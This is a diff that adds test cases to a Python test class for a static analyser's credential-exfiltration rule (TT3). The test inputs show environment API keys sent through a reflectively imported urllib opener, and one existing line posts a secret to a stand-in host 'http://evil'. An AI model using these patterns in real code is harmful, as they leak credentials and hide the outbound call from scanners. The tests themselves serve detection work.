@@ -94,6 +94,32 @@ class TestCredentialExfiltration:
 
         assert "TT3" not in _rule_ids(_run(code))
 
+    def test_reflective_handle_does_not_leak_across_function_scopes(self):
+        code = (
+            "import importlib, os\n"
+            "def configure():\n"
+            '    module = importlib.import_module("urllib.request")\n'
+            '    opener = getattr(module, "urlopen")\n'
+            "    return opener\n"
+            "def send():\n"
+            '    secret = os.environ.get("API_KEY")\n'
+            "    return opener(secret)\n"
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_reflective_handle_used_before_reassignment_keeps_sink_identity(self):
+        code = (
+            "import importlib, os\n"
+            '_mod = importlib.import_module("urllib.request")\n'
+            'opener = getattr(_mod, "urlopen")\n'
+            'secret = os.environ.get("API_KEY")\n'
+            "opener(secret)\n"
+            "opener = lambda value: value\n"
+        )
+
+        assert "TT3" in _rule_ids(_run(code))
+
     def test_same_line_taint_sinks_preserve_both_occurrences(self) -> None:
         call = 'requests.post("http://evil", data=secret)'
         code = f'import os, requests\nsecret = os.environ.get("KEY")\n{call}; {call}\n'
